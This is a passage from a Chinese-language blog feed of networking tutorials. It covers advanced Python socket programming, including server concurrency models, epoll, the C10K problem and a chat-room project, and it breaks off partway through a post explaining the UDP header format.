class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_client</span>(<span class="hljs-params">client_sock</span>):<br>    data = client_sock.recv(<span class="hljs-number">1024</span>)<br>    client_sock.send(response)<br>    client_sock.close()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    client, addr = server.accept()<br>    thread = threading.Thread(target=handle_client, args=(client,))<br>    thread.start()<br><br>优点：<br>✅ 可以同时处理多个客户端<br>✅ 代码相对简单<br><br>缺点：<br>❌ 线程开销大（内存、上下文切换）<br>❌ 最多几千个线程<br>❌ C10K问题（<span class="hljs-number">10000</span>并发）<br><br>适用：<br>- 中小规模应用<br>- 每个连接处理时间较长<br></code></pre></td></tr></table></figure><p><strong>3. 多进程（进程池）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>(<span class="hljs-params">server_sock</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        client, addr = server_sock.accept()<br>        handle_client(client)<br><br><span class="hljs-comment"># 创建多个工作进程</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    p = Process(target=worker, args=(server,))<br>    p.start()<br><br>优点：<br>✅ 利用多核CPU<br>✅ 进程隔离，稳定性好<br><br>缺点：<br>❌ 进程开销更大<br>❌ 进程数量有限<br>❌ 进程间通信复杂<br><br>适用：<br>- CPU密集型任务<br>- 需要进程隔离<br></code></pre></td></tr></table></figure><p><strong>4. IO多路复用 + 单线程（高性能）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">epoll = select.epoll()<br>epoll.register(server.fileno(), select.EPOLLIN)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    events = epoll.poll()<br>    <span class="hljs-keyword">for</span> fd, event <span class="hljs-keyword">in</span> events:<br>        <span class="hljs-comment"># 处理事件</span><br>        <span class="hljs-keyword">pass</span><br><br>优点：<br>✅ 高性能（C10K、C100K）<br>✅ 资源占用少<br>✅ 单线程，无锁<br><br>缺点：<br>❌ 代码复杂<br>❌ 回调地狱<br><br>适用：<br>- IO密集型<br>- 大量并发连接<br>- 高性能要求<br></code></pre></td></tr></table></figure><p><strong>5. IO多路复用 + 线程池（推荐）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br>executor = ThreadPoolExecutor(max_workers=<span class="hljs-number">10</span>)<br>epoll = select.epoll()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    events = epoll.poll()<br>    <span class="hljs-keyword">for</span> fd, event <span class="hljs-keyword">in</span> events:<br>        <span class="hljs-comment"># 提交到线程池处理</span><br>        executor.submit(handle_event, fd, event)<br><br>优点：<br>✅ 高并发（epoll）<br>✅ 利用多核（线程池）<br>✅ 代码相对简单<br><br>缺点：<br>⚠️ 需要处理线程安全<br><br>适用：<br>- 生产环境推荐<br>- IO + CPU混合负载<br></code></pre></td></tr></table></figure><p><strong>6. Reactor模式（事件驱动）</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Reactor模式（Twisted、asyncio）：<br><br>组件：<br><span class="hljs-bullet">1.</span> Reactor: 事件循环<br><span class="hljs-bullet">2.</span> Handler: 事件处理器<br><span class="hljs-bullet">3.</span> Acceptor: 接受新连接<br><br>流程：<br><span class="hljs-bullet">1.</span> Reactor监听事件<br><span class="hljs-bullet">2.</span> 事件到达 → 调用对应Handler<br><span class="hljs-bullet">3.</span> Handler处理 → 返回Reactor<br><br>优点：<br>✅ 高性能<br>✅ 框架成熟<br><br>适用：<br><span class="hljs-bullet">-</span> 使用异步框架<br><span class="hljs-bullet">-</span> asyncio、Twisted、Tornado<br></code></pre></td></tr></table></figure><h3 id="4-2-C10K问题"><a href="#4-2-C10K问题" class="headerlink" title="4.2 C10K问题"></a>4.2 C10K问题</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs markdown">C10K = 10000个并发连接<br><br>历史：<br><span class="hljs-bullet">-</span> 2000年前：Apache使用多线程/多进程<br><span class="hljs-bullet">-</span> 问题：10000个线程 → 内存耗尽、上下文切换频繁<br><br>解决方案：<br><span class="hljs-bullet">1.</span> Nginx: IO多路复用 + 事件驱动<br><span class="hljs-bullet">2.</span> 使用epoll（Linux）或kqueue（BSD）<br><span class="hljs-bullet">3.</span> 非阻塞IO + 状态机<br><br>现在：<br><span class="hljs-bullet">-</span> C10K已经不是问题<br><span class="hljs-bullet">-</span> C100K、C1000K（百万并发）成为新目标<br><span class="hljs-bullet">-</span> 需要更多优化：内核参数、零拷贝等<br></code></pre></td></tr></table></figure><hr><h2 id="5-实战项目：多人聊天室"><a href="#5-实战项目：多人聊天室" class="headerlink" title="5. 实战项目：多人聊天室"></a>5. 实战项目：多人聊天室</h2><h3 id="5-1-项目需求"><a href="#5-1-项目需求" class="headerlink" title="5.1 项目需求"></a>5.1 项目需求</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">功能需求：<br><span class="hljs-bullet">1.</span> 支持多用户同时在线<br><span class="hljs-bullet">2.</span> 用户可以设置昵称<br><span class="hljs-bullet">3.</span> 消息广播给所有用户<br><span class="hljs-bullet">4.</span> 显示用户上线/下线通知<br><span class="hljs-bullet">5.</span> 查看在线用户列表<br><span class="hljs-bullet">6.</span> 私聊功能<br><span class="hljs-bullet">7.</span> 房间/频道功能<br><br>技术要求：<br><span class="hljs-bullet">-</span> 使用TCP协议<br><span class="hljs-bullet">-</span> 使用IO多路复用（epoll/select）<br><span class="hljs-bullet">-</span> 服务器单线程<br><span class="hljs-bullet">-</span> 支持至少100个并发连接<br></code></pre></td></tr></table></figure><h3 id="5-2-协议设计"><a href="#5-2-协议设计" class="headerlink" title="5.2 协议设计"></a>5.2 协议设计</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python">消息格式（JSON）：<br><br><span class="hljs-number">1.</span> 加入聊天室<br>&#123;<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;join&quot;</span>,<br>    <span class="hljs-string">&quot;nickname&quot;</span>: <span class="hljs-string">&quot;Alice&quot;</span><br>&#125;<br><br><span class="hljs-number">2.</span> 普通消息<br>&#123;<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;message&quot;</span>,<br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&quot;Hello everyone!&quot;</span><br>&#125;<br><br><span class="hljs-number">3.</span> 私聊<br>&#123;<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;private&quot;</span>,<br>    <span class="hljs-string">&quot;to&quot;</span>: <span class="hljs-string">&quot;Bob&quot;</span>,<br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&quot;Hi Bob!&quot;</span><br>&#125;<br><br><span class="hljs-number">4.</span> 列出用户<br>&#123;<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;list_users&quot;</span><br>&#125;<br><br><span class="hljs-number">5.</span> 退出<br>&#123;<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;quit&quot;</span><br>&#125;<br><br>服务器响应：<br>&#123;<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;broadcast&quot;</span>,<br>    <span class="hljs-string">&quot;from&quot;</span>: <span class="hljs-string">&quot;Alice&quot;</span>,<br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&quot;Hello everyone!&quot;</span>,<br>    <span class="hljs-string">&quot;timestamp&quot;</span>: <span class="hljs-string">&quot;2024-01-15 10:30:00&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-3-工具演示"><a href="#5-3-工具演示" class="headerlink" title="5.3 工具演示"></a>5.3 工具演示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 启动聊天室服务器</span><br>python day18_chat_server.py --host 0.0.0.0 --port 8888<br><br><span class="hljs-comment"># 启动聊天室客户端</span><br>python day18_chat_client.py --host 127.0.0.1 --port 8888 --nickname Alice<br></code></pre></td></tr></table></figure><hr><h2 id="6-今日练习"><a href="#6-今日练习" class="headerlink" title="6. 今日练习"></a>6. 今日练习</h2><h3 id="练习1：阻塞vs非阻塞"><a href="#练习1：阻塞vs非阻塞" class="headerlink" title="练习1：阻塞vs非阻塞"></a>练习1：阻塞vs非阻塞</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 编写程序比较阻塞和非阻塞socket的行为</span><br><span class="hljs-comment"># 1. 创建阻塞socket，测量recv()的等待时间</span><br><span class="hljs-comment"># 2. 创建非阻塞socket，测量recv()的返回时间</span><br><span class="hljs-comment"># 3. 对比差异</span><br></code></pre></td></tr></table></figure><h3 id="练习2：实现select服务器"><a href="#练习2：实现select服务器" class="headerlink" title="练习2：实现select服务器"></a>练习2：实现select服务器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 使用select实现简单的回显服务器</span><br><span class="hljs-comment"># 要求：</span><br><span class="hljs-comment"># 1. 支持多客户端同时连接</span><br><span class="hljs-comment"># 2. 每个客户端发送的数据原样返回</span><br><span class="hljs-comment"># 3. 显示连接/断开信息</span><br></code></pre></td></tr></table></figure><h3 id="练习3：性能测试"><a href="#练习3：性能测试" class="headerlink" title="练习3：性能测试"></a>练习3：性能测试</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 编写压力测试工具</span><br><span class="hljs-comment"># 1. 创建100个并发连接</span><br><span class="hljs-comment"># 2. 每个连接发送100条消息</span><br><span class="hljs-comment"># 3. 测量总耗时和QPS</span><br><span class="hljs-comment"># 4. 对比不同IO模型的性能</span><br></code></pre></td></tr></table></figure><h3 id="练习4：聊天室扩展"><a href="#练习4：聊天室扩展" class="headerlink" title="练习4：聊天室扩展"></a>练习4：聊天室扩展</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 为聊天室添加功能：</span><br><span class="hljs-comment"># 1. 用户认证（登录）</span><br><span class="hljs-comment"># 2. 消息历史记录</span><br><span class="hljs-comment"># 3. 文件传输</span><br><span class="hljs-comment"># 4. 表情支持</span><br></code></pre></td></tr></table></figure><hr><h2 id="7-常见问题"><a href="#7-常见问题" class="headerlink" title="7. 常见问题"></a>7. 常见问题</h2><p><strong>Q1：阻塞和非阻塞的本质区别是什么？</strong></p><p>A：</p><ul><li>阻塞：系统调用会等待，直到条件满足</li><li>非阻塞：系统调用立即返回，如果未就绪返回错误</li></ul><p><strong>Q2：select&#x2F;poll&#x2F;epoll应该选哪个？</strong></p><p>A：</p><ul><li>Linux生产环境：epoll（性能最好）</li><li>跨平台开发：select或poll</li><li>少量连接：select够用</li><li>大量连接：必须epoll</li></ul><p><strong>Q3：为什么epoll比select快？</strong></p><p>A：</p><ol><li>select需要遍历所有fd（O(n)），epoll只返回就绪的（O(1)）</li><li>select每次调用都要拷贝fd_set，epoll使用mmap</li><li>epoll支持边缘触发，减少系统调用</li></ol><p><strong>Q4：什么时候用多线程，什么时候用IO多路复用？</strong></p><p>A：</p><ul><li>IO密集型：IO多路复用</li><li>CPU密集型：多线程&#x2F;多进程</li><li>混合型：IO多路复用 + 线程池</li></ul><p><strong>Q5：异步IO和IO多路复用有什么区别？</strong></p><p>A：</p><ul><li>IO多路复用：同步非阻塞，select&#x2F;epoll通知就绪</li><li>异步IO：真正的异步，系统完成IO后通知</li><li>Linux的AIO支持不完善，实际多用IO多路复用</li></ul><hr><h2 id="8-总结"><a href="#8-总结" class="headerlink" title="8. 总结"></a>8. 总结</h2><p>今天我们学习了：</p><h3 id="核心知识点"><a href="#核心知识点" class="headerlink" title="核心知识点"></a>核心知识点</h3><ol><li><p><strong>阻塞vs非阻塞</strong>：</p><ul><li>阻塞：等待直到就绪</li><li>非阻塞：立即返回，未就绪返回错误</li></ul></li><li><p><strong>IO多路复用</strong>：</p><ul><li>select：跨平台，有限制</li><li>poll：改进的select</li><li>epoll：Linux高性能（推荐）</li></ul></li><li><p><strong>Socket选项</strong>：</p><ul><li>SO_REUSEADDR：地址重用</li><li>TCP_NODELAY：禁用Nagle</li><li>SO_KEEPALIVE：保活机制</li></ul></li><li><p><strong>服务器架构</strong>：</p><ul><li>单线程阻塞：简单但慢</li><li>多线程：简单但有限</li><li>IO多路复用：高性能推荐</li><li>Reactor模式：事件驱动</li></ul></li><li><p><strong>实战技巧</strong>：</p><ul><li>选择合适的IO模型</li><li>配置Socket选项</li><li>处理并发连接</li></ul></li></ol><h3 id="重点回顾"><a href="#重点回顾" class="headerlink" title="重点回顾"></a>重点回顾</h3><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">高性能网络编程 </span>=<span class="hljs-string"> IO多路复用 + 非阻塞Socket</span><br><span class="hljs-string"></span><br><span class="hljs-string">Linux推荐：</span><br><span class="hljs-string">epoll + 非阻塞 + 边缘触发</span><br><span class="hljs-string"></span><br><span class="hljs-string">架构选择：</span><br><span class="hljs-string">IO密集 → epoll单线程</span><br><span class="hljs-string">CPU密集 → 多进程</span><br><span class="hljs-string">混合 → epoll + 线程池</span><br></code></pre></td></tr></table></figure><h3 id="明天预告"><a href="#明天预告" class="headerlink" title="明天预告"></a>明天预告</h3><p><strong>第19天：HTTP协议基础</strong></p><p>内容预览：</p><ul><li>HTTP协议概述</li><li>HTTP请求和响应格式</li><li>HTTP方法详解</li><li>HTTP状态码</li><li>Cookie和Session</li><li>实现简单的HTTP服务器</li></ul><hr><p><strong>继续加油！</strong> 🚀</p><p>今天我们学习了高级Socket编程技术，理解了如何构建高性能服务器。这些知识是现代网络编程的核心，也是很多Web框架的底层实现原理。明天我们将学习应用层的HTTP协议！</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>17天：UDP协议详解</title>
    <link href="/2025/11/10/17%E5%A4%A9%EF%BC%9AUDP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/11/10/17%E5%A4%A9%EF%BC%9AUDP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="第17天：UDP协议详解"><a href="#第17天：UDP协议详解" class="headerlink" title="第17天：UDP协议详解"></a>第17天：UDP协议详解</h1><h2 id="今日目标"><a href="#今日目标" class="headerlink" title="今日目标"></a>今日目标</h2><ul><li>理解UDP协议的特点和工作原理</li><li>掌握UDP报文格式</li><li>深入对比UDP和TCP的区别</li><li>了解UDP的应用场景</li><li>掌握UDP编程技巧</li><li>实现基于UDP的应用程序</li><li>了解如何在UDP上实现可靠传输</li></ul><hr><h2 id="1-UDP协议概述"><a href="#1-UDP协议概述" class="headerlink" title="1. UDP协议概述"></a>1. UDP协议概述</h2><h3 id="1-1-什么是UDP？"><a href="#1-1-什么是UDP？" class="headerlink" title="1.1 什么是UDP？"></a>1.1 什么是UDP？</h3><p><strong>UDP（User Datagram Protocol，用户数据报协议）</strong> 是一种简单的、无连接的传输层协议。</p><p><strong>生活类比</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs markdown">UDP就像寄明信片：<br><span class="hljs-bullet">1.</span> 写好地址直接投递（无需建立连接）<br><span class="hljs-bullet">2.</span> 不保证一定送达（尽力而为）<br><span class="hljs-bullet">3.</span> 不保证按顺序到达（可能乱序）<br><span class="hljs-bullet">4.</span> 快速简单（开销小）<br><br>TCP就像打电话：<br><span class="hljs-bullet">1.</span> 先拨号建立连接<br><span class="hljs-bullet">2.</span> 保证对方听到（有确认）<br><span class="hljs-bullet">3.</span> 按顺序传递信息<br><span class="hljs-bullet">4.</span> 相对慢一些（开销大）<br></code></pre></td></tr></table></figure><h3 id="1-2-UDP的核心特点"><a href="#1-2-UDP的核心特点" class="headerlink" title="1.2 UDP的核心特点"></a>1.2 UDP的核心特点</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs markdown">UDP = 简单、快速、无连接、不可靠<br><br>✅ 优点：<br><span class="hljs-bullet">1.</span> 无连接<br>   └─ 不需要三次握手和四次挥手<br>   └─ 减少延迟<br><br><span class="hljs-bullet">2.</span> 开销小<br>   └─ 头部只有8字节（TCP是20-60字节）<br>   └─ 无需维护连接状态<br><br><span class="hljs-bullet">3.</span> 速度快<br>   └─ 无流量控制<br>   └─ 无拥塞控制<br>   └─ 发送即可<br><br><span class="hljs-bullet">4.</span> 支持一对多<br>   └─ 支持广播和组播<br>   └─ 一个包可以发给多个接收方<br><br><span class="hljs-bullet">5.</span> 面向数据报<br>   └─ 保留消息边界<br>   └─ 应用层发送多少，就传输多少<br><br>❌ 缺点：<br><span class="hljs-bullet">1.</span> 不可靠<br>   └─ 数据可能丢失<br>   └─ 数据可能重复<br>   └─ 数据可能乱序<br><br><span class="hljs-bullet">2.</span> 无流量控制<br>   └─ 可能淹没接收方<br><br><span class="hljs-bullet">3.</span> 无拥塞控制<br>   └─ 可能造成网络拥塞<br><br><span class="hljs-bullet">4.</span> 无连接状态<br>   └─ 应用层需要自己管理<br></code></pre></td></tr></table></figure><h3 id="1-3-UDP适用场景"><a href="#1-3-UDP适用场景" class="headerlink" title="1.3 UDP适用场景"></a>1.3 UDP适用场景</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs markdown">适合使用UDP的场景：<br><br><span class="hljs-bullet">1.</span> 实时性要求高<br>   ├─ 视频直播<br>   ├─ 语音通话（VoIP）<br>   ├─ 网络游戏<br>   └─ 视频会议<br><br><span class="hljs-bullet">2.</span> 可以容忍少量丢包<br>   ├─ 流媒体（跳过丢失的帧）<br>   └─ 传感器数据（下一次更新会覆盖）<br><br><span class="hljs-bullet">3.</span> 简单的请求-应答<br>   ├─ DNS查询<br>   └─ DHCP<br><br><span class="hljs-bullet">4.</span> 广播/组播应用<br>   ├─ 网络发现<br>   ├─ 服务通告<br>   └─ 多播视频<br><br><span class="hljs-bullet">5.</span> 数据量小<br>   ├─ 单个请求-响应可以放在一个UDP包中<br>   └─ 如DNS查询<br><br>不适合UDP的场景：<br>❌ 文件传输（需要可靠性）<br>❌ 邮件发送（不能丢失）<br>❌ 网页浏览（需要完整内容）<br>❌ 数据库查询（需要准确结果）<br></code></pre></td></tr></table></figure><hr><h2 id="2-UDP报文格式"><a href="#2-UDP报文格式" class="headerlink" title="2. UDP报文格式"></a>2. UDP报文格式</h2><h3 id="2-1-UDP数据报结构"><a href="#2-1-UDP数据报结构" class="headerlink" title="2.1 UDP数据报结构"></a>2.1 UDP数据报结构</h3><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">UDP数据报 </span>=<span class="hljs-string"> UDP头部 + 应用数据</span><br><span class="hljs-string"></span><br><span class="hljs-string">┌─────────────────────────────────────┐</span><br><span class="hljs-string">│       UDP 头部 (8 字节)              │</span><br><span class="hljs-string">├─────────────────────────────────────┤</span><br><span class="hljs-string">│       应用数据 (可变长度)             │</span><br><span class="hljs-string">└─────────────────────────────────────┘</span><br></code></pre></td></tr></table></figure><h3 id="2-2-UDP头部格式"><a href="#2-2-UDP头部格式" class="headerlink" title="2.2 UDP头部格式"></a>2.2 UDP头部格式</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code"> 0                   1                   2                   3</span><br><span class="hljs-section"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|          源端口 (16位)         |        目标端口 (16位)         |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="hljs-section">|         长度 (16位)            |        校验和 (16位)           |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br>|                                                                |<br>|                          数据                                  |<br><span class="hljs-section">|                                                                |</span><br><span class="hljs-section">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><br>总共只有4个字段，每个16位（2字节）<br></code></pre></td></tr></table></figure><h3 id="2-3-字段详解"><a href="#2-3-字段详解" class="headerlink" title="2.3 字段详解"></a>2.3 字段详解</h3><p><strong>1. 源端口（Source Port，16位）</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">作用：标识发送方应用进程<br>范围：0 ~ 65535<br>可选：可以设置为0（不需要回复时）<br><br>示例：<br>客户端随机端口：54321<br></code></pre></td></tr></table></figure><p><strong>2. 目标端口（Destination Port，16位）</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">作用：标识接收方应用进程<br>范围：0 ~ 65535<br>必须：总是需要指定<br><br>示例：<br>DNS服务器端口：53<br></code></pre></td></tr></table></figure><p><strong>3. 长度（Length，16位）</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tap">作用：UDP数据报的总长度（头部+数据）<br>单位：字节<br>范围：8 ~ 65535<br>最小值：8（只有头部，无数据）<br><br>计算：<br>长度 = UDP头部(8字节) + 数据长度<br><br>示例：<br>发送 